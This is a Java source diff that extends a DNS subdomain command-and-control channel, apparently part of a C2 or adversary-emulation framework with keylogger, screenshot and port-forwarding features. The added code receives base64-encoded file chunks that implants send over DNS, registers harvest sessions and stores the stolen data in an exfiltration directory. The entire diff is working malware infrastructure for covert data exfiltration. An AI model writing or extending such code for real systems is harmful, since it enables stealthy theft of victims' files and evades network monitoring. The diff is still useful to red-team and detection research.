@@ -27,8 +27,12 @@ import c2.crypto.NullEncryptor;
 import c2.file.ScreenshotHelper;
 import c2.session.IOManager;
 import c2.session.Session;
+import c2.session.filereceiver.FileReceiverDatagramHandler;
 
 public class DNSEmulatorSubdomainComms extends C2Interface {
+	public static final String DIRECTORY_HARVEST_TAG = "<dir_harv>";
+	public static final String DIRECTORY_HARVEST_BREAK_TAG = "<hv>";
+	
 	private int port;
 	private IOManager io;
 	private Properties properties;
@@ -54,6 +58,7 @@ public class DNSEmulatorSubdomainComms extends C2Interface {
 
 	private KeyloggerProcessor keylogger;
 	private HarvestProcessor harvester;
+	private FileReceiverDatagramHandler fileReceiverProcessor;
 
 	public void initialize(IOManager io, Properties prop, KeyloggerProcessor keylogger, HarvestProcessor harvester) {
 		this.properties = prop;
@@ -69,6 +74,7 @@ public class DNSEmulatorSubdomainComms extends C2Interface {
 
 		this.keylogger = keylogger;
 		this.harvester = harvester;
+		fileReceiverProcessor = new FileReceiverDatagramHandler(Paths.get(prop.getProperty(Constants.DAEMON_EXFILTEST_DIRECTORY)));
 	}
 
 	@Override
@@ -243,6 +249,24 @@ public class DNSEmulatorSubdomainComms extends C2Interface {
 						io.updateSessionContactTime(sessionId);
 						if (message.equals("<req-session>")) {
 							response = sessionId + "";
+						}else if(message.startsWith(DIRECTORY_HARVEST_TAG)) {
+							String[] harvestElements = message.substring(DIRECTORY_HARVEST_TAG.length()).split(DIRECTORY_HARVEST_BREAK_TAG);
+							if (harvestElements.length != 2) {
+								response = "Invalid request";
+							} else {
+								try {
+									int harvestSession = Integer.parseInt(harvestElements[0]);
+									if(!fileReceiverProcessor.hasSessionCurrently(sessionId, harvestSession)) {
+										fileReceiverProcessor.registerNewSession(sessionId, harvestSession, hostname);
+									}
+									byte[] harvestData = Base64.getDecoder().decode(harvestElements[1]);
+									fileReceiverProcessor.processIncoming(sessionId, harvestSession, harvestData);
+									response = "accepted";
+								}catch(IllegalArgumentException ex)
+								{
+									response = "Invalid request";
+								}
+							}
 						} else if (message.startsWith("<portForward>")) {
 							String[] pfRequest = message.substring("<portForward>".length()).split("<pf>");
 							if (pfRequest.length != 2) {
